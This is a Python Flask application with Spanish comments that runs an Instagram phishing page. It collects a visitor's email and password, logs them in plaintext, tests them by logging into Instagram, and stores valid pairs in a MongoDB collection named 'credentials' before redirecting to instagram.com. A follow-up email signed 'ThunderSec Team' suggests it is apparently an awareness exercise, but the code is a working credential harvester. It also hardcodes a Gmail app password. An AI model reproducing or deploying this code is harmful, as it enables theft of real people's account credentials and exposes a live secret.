from flask import Flask, request, render_template, redirect
import instaloader
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import os
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

app = Flask(__name__)

# Configuración de logger para la muestra de logs en Vercel
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Obtención de URI MongoDB desde las variables de entorno en Vercel
uri = os.getenv("MONGODB_URI")

# Configuración de BBDD MongoDB
client = MongoClient(uri, server_api=ServerApi('1'))
db = client.fishcatcher
collection = db.credentials

def instaloader_check(email, password):
    loader = instaloader.Instaloader()

    try:
        # Intento de inicio de sesión
        loader.login(email, password)
        return "Inicio de sesion correcto"
    except instaloader.exceptions.BadCredentialsException:
        logger.error("Credenciales incorrectas")
    except instaloader.exceptions.TwoFactorAuthRequiredException:
        logger.info("La cuenta requiere autenticación de dos factores")
    except Exception as e:
        error_message = str(e).lower()
        
        if "fail" in error_message and "status" in error_message:
            return "Credenciales incorrectas"
        elif "checkpoint" in error_message:
            logger.error("La cuenta está bloqueada por un checkpoint de Instagram")
        elif "two_factor" in error_message:
            logger.info("La cuenta requiere autenticación de dos factores")
        elif "does not exist" in error_message:
            return "Usuario no existente"
        else:
            logger.error(f"Error: {error_message}")

def send_email(email):
    # Configuración del remitente, destinatario y contraseña de la cuenta de correo electrónico desde donde se van a realizar los envíos
    remitente = "instragramacounts@gmail.com"
    destinatario = email
    password = "zvrl uvst qphk ijll"

    # Asignación de campos y valores
    msg = MIMEMultipart()
    msg['From'] = "ThunderSec Team"
    msg['To'] = destinatario
    msg['Subject'] = "Importante: Tus datos han sido guardados"

    # Lectura e insercción del html personalizado en el cuerpo correo
    with open("infomail.html", "r", encoding="utf-8") as archivo_html:
            cuerpo_html = archivo_html.read()
    msg.attach(MIMEText(cuerpo_html, 'html'))

    # Conexion al servidor SMTP y envío de email
    try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(remitente, password)

            server.sendmail(remitente, destinatario, msg.as_string())
            print("Email enviado correctamente")
    except Exception as e:
            print(f"Error al enviar el email {e}")

    finally:
            server.quit()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # Recolección de credenciales del formulario
        email = request.form.get('email')
        password = request.form.get('password')

        # Log en servidor con las credenciales obtenidas
        logger.info(f"Datos recibidos: email={email}, password={password}")

        # Comprobación de credenciales válidas con Instaloader
        result = instaloader_check(email, password)

        # Comprobación de inicio de sesión correcto
        if result == "Inicio de sesion correcto":
            # Inserción de datos en la BBDD MongoDB
            collection.insert_one({"email": email, "password": password})

            # Envío de e-mail de prevención a la víctima
            send_email(email)

            # Log en servidor con mensaje informativo de almacenamiento correcto de credenciales en caso de que sean válidas
            logger.info("MONGODB: DATOS ALMACENADOS CORRECTAMENTE EN LA BBDD.")
        else:
            # Log en servidor con mensaje de error en caso de que las credenciales no sean válidas y redireccionamiento al sitio oficial de Instagram
            logger.error("MONGODB ERROR: CREDENCIALES INVÁLIDAS, NO SE REALIZA GUARDADO EN LA BBDD")
        return redirect("https://instagram.com")
    except Exception as e:
        # Log de error en caso de error en el proceso de almacenamiento en la BBDD MongoDB
        logger.error(f"MONGODB ERROR: ERROR AL ALMACENAR CREDENCIALES: {e}")

if __name__ == '__main__':
    app.run(port=5001)
